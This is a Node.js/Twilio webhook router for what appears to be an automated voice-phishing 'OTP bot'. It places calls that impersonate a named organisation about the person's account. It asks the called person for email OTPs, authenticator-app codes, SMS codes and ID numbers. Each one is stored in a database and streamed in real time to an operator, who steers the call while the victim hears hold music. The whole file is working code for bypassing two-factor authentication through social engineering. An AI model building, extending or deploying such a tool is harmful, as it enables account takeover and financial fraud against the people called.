const express = require('express');
const router = express.Router();
const VoiceResponse = require('twilio').twiml.VoiceResponse;
const db = require('../database/db');

// Test endpoint - Check if server is reachable
router.get('/test', (req, res) => {
    res.send('Webhook is working! Server is online.');
});

// Main voice response - NO sessionId required, get it from query or body
router.post('/voice-response', async (req, res) => {
    const sessionId = req.body.sessionId || req.query.sessionId;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    if (!sessionId) {
        twiml.say('Invalid session. Goodbye.');
        twiml.hangup();
        return res.type('text/xml').send(twiml.toString());
    }
    
    try {
        const session = await db.query(
            `SELECT cs.*, c.full_name FROM call_sessions cs 
             JOIN contacts c ON cs.contact_id = c.id 
             WHERE cs.id = $1`,
            [sessionId]
        );
        
        if (session.rows.length === 0) {
            twiml.say('Session not found. Goodbye.');
            twiml.hangup();
            return res.type('text/xml').send(twiml.toString());
        }
        
        const callData = session.rows[0];
        const currentAction = callData.current_action;
        const fullName = callData.full_name;
        const subject = callData.subject;
        const customIntro = callData.custom_intro;
        
        if (currentAction === 'consent') {
            const gather = twiml.gather({
                numDigits: 1,
                action: `/webhooks/handle-consent?sessionId=${sessionId}`,
                method: 'POST',
                timeout: 10
            });
            
            let greeting = fullName ? `Hello ${fullName}, ` : 'Hello our valued client, ';
            
            if (subject && customIntro) {
                gather.say(`${greeting}${customIntro} Press 1 to continue.`);
            } else if (subject) {
                gather.say(`${greeting}This is ${subject} calling. Press 1 to continue.`);
            } else {
                gather.say(`${greeting}We are contacting you regarding your account. Press 1 to continue.`);
            }
            
            twiml.say('We did not receive any input. Goodbye.');
            twiml.hangup();
            
        } else if (currentAction === 'waiting_for_email_otp') {
            const gather = twiml.gather({
                numDigits: 6,
                action: `/webhooks/collect-email-otp?sessionId=${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter the 6 digit OTP from your email followed by the pound key.');
            twiml.say('No input received. Goodbye.');
            twiml.hangup();
            
        } else if (currentAction === 'waiting_for_auth_otp') {
            const gather = twiml.gather({
                numDigits: 6,
                action: `/webhooks/collect-auth-otp?sessionId=${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter the 6 digit code from your authenticator app followed by the pound key.');
            twiml.say('No input received. Goodbye.');
            twiml.hangup();
            
        } else if (currentAction === 'waiting_for_phone_otp') {
            const gather = twiml.gather({
                numDigits: 6,
                action: `/webhooks/collect-phone-otp?sessionId=${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter the 6 digit OTP sent to your phone followed by the pound key.');
            twiml.say('No input received. Goodbye.');
            twiml.hangup();
            
        } else if (currentAction === 'waiting_for_id') {
            const gather = twiml.gather({
                numDigits: 20,
                action: `/webhooks/collect-id?sessionId=${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter your ID number followed by the pound key.');
            twiml.say('No input received. Goodbye.');
            twiml.hangup();
            
        } else if (currentAction === 'playing_music') {
            const play = twiml.play({
                loop: 10
            });
            play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
            twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
        } else {
            twiml.say('Please wait for admin instructions.');
            twiml.hangup();
        }
        
        res.type('text/xml');
        res.send(twiml.toString());
        
    } catch (error) {
        console.error('Error in voice response:', error);
        const twiml = new VoiceResponse();
        twiml.say('An error occurred. Please try again later.');
        twiml.hangup();
        res.type('text/xml');
        res.send(twiml.toString());
    }
});

router.post('/handle-consent', async (req, res) => {
    const sessionId = req.body.sessionId || req.query.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    if (!sessionId) {
        twiml.say('Invalid session. Goodbye.');
        twiml.hangup();
        return res.type('text/xml').send(twiml.toString());
    }
    
    if (Digits === '1') {
        await db.query(
            `INSERT INTO collected_data (session_id, data_type, data_value) VALUES ($1, $2, $3)`,
            [sessionId, 'consent', '1']
        );
        
        await db.query(
            `UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`,
            [sessionId]
        );
        
        io.emit('user_response', { session_id: sessionId, type: 'consent', value: '1' });
        
        twiml.say('Please wait as we serve you.');
        const play = twiml.play({ loop: 10 });
        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
        twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
        
    } else {
        twiml.say('You did not press 1. Goodbye.');
        twiml.hangup();
        await db.query(`UPDATE call_sessions SET status = 'completed', ended_at = NOW() WHERE id = $1`, [sessionId]);
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/collect-email-otp', async (req, res) => {
    const sessionId = req.body.sessionId || req.query.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    if (!sessionId) {
        twiml.say('Invalid session. Goodbye.');
        twiml.hangup();
        return res.type('text/xml').send(twiml.toString());
    }
    
    if (Digits) {
        const session = await db.query(
            `SELECT contact_id FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        await db.query(
            `INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`,
            [sessionId, session.rows[0].contact_id, 'email_otp', Digits]
        );
        
        await db.query(
            `UPDATE contacts SET email_otp = $1 WHERE id = $2`,
            [Digits, session.rows[0].contact_id]
        );
        
        io.emit('data_collected', { session_id: sessionId, type: 'email_otp', value: Digits });
        
        twiml.say('Please wait as we validate your identity.');
        const play = twiml.play({ loop: 10 });
        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
        twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
        
    } else {
        twiml.say('No OTP received. Goodbye.');
        twiml.hangup();
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/collect-auth-otp', async (req, res) => {
    const sessionId = req.body.sessionId || req.query.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    if (!sessionId) {
        twiml.say('Invalid session. Goodbye.');
        twiml.hangup();
        return res.type('text/xml').send(twiml.toString());
    }
    
    if (Digits) {
        const session = await db.query(
            `SELECT contact_id FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        await db.query(
            `INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`,
            [sessionId, session.rows[0].contact_id, 'auth_otp', Digits]
        );
        
        await db.query(
            `UPDATE contacts SET auth_otp = $1 WHERE id = $2`,
            [Digits, session.rows[0].contact_id]
        );
        
        io.emit('data_collected', { session_id: sessionId, type: 'auth_otp', value: Digits });
        
        twiml.say('Please wait as we validate your identity.');
        const play = twiml.play({ loop: 10 });
        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
        twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
        
    } else {
        twiml.say('No code received. Goodbye.');
        twiml.hangup();
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/collect-phone-otp', async (req, res) => {
    const sessionId = req.body.sessionId || req.query.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    if (!sessionId) {
        twiml.say('Invalid session. Goodbye.');
        twiml.hangup();
        return res.type('text/xml').send(twiml.toString());
    }
    
    if (Digits) {
        const session = await db.query(
            `SELECT contact_id FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        await db.query(
            `INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`,
            [sessionId, session.rows[0].contact_id, 'phone_otp', Digits]
        );
        
        await db.query(
            `UPDATE contacts SET phone_otp = $1 WHERE id = $2`,
            [Digits, session.rows[0].contact_id]
        );
        
        io.emit('data_collected', { session_id: sessionId, type: 'phone_otp', value: Digits });
        
        twiml.say('Please wait as we validate your identity.');
        const play = twiml.play({ loop: 10 });
        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
        twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
        
    } else {
        twiml.say('No OTP received. Goodbye.');
        twiml.hangup();
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/collect-id', async (req, res) => {
    const sessionId = req.body.sessionId || req.query.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    if (!sessionId) {
        twiml.say('Invalid session. Goodbye.');
        twiml.hangup();
        return res.type('text/xml').send(twiml.toString());
    }
    
    if (Digits) {
        const session = await db.query(
            `SELECT contact_id FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        await db.query(
            `INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`,
            [sessionId, session.rows[0].contact_id, 'id_number', Digits]
        );
        
        await db.query(
            `UPDATE contacts SET id_number = $1 WHERE id = $2`,
            [Digits, session.rows[0].contact_id]
        );
        
        io.emit('data_collected', { session_id: sessionId, type: 'id_number', value: Digits });
        
        twiml.say('Please wait as we validate your identity.');
        const play = twiml.play({ loop: 10 });
        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
        twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
        
    } else {
        twiml.say('No ID received. Goodbye.');
        twiml.hangup();
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/check-action', async (req, res) => {
    const sessionId = req.body.sessionId || req.query.sessionId;
    const twiml = new VoiceResponse();
    
    if (!sessionId) {
        twiml.say('Invalid session. Goodbye.');
        twiml.hangup();
        return res.type('text/xml').send(twiml.toString());
    }
    
    const session = await db.query(
        `SELECT current_action FROM call_sessions WHERE id = $1`,
        [sessionId]
    );
    
    if (session.rows[0] && session.rows[0].current_action === 'playing_music') {
        const play = twiml.play({ loop: 5 });
        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
        twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
    } else {
        twiml.redirect(`/webhooks/voice-response?sessionId=${sessionId}`, { method: 'POST' });
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/call-status', async (req, res) => {
    const sessionId = req.body.sessionId || req.query.sessionId;
    const { CallStatus, Duration } = req.body;
    const io = req.app.get('io');
    
    if (sessionId) {
        await db.query(
            `UPDATE call_sessions SET status = $1, duration_seconds = $2, ended_at = CASE WHEN $1 IN ('completed', 'failed') THEN NOW() ELSE ended_at END WHERE id = $3`,
            [CallStatus, Duration || 0, sessionId]
        );
        
        io.emit('call_status', { session_id: sessionId, status: CallStatus, duration: Duration });
    }
    
    res.sendStatus(200);
});

module.exports = router;
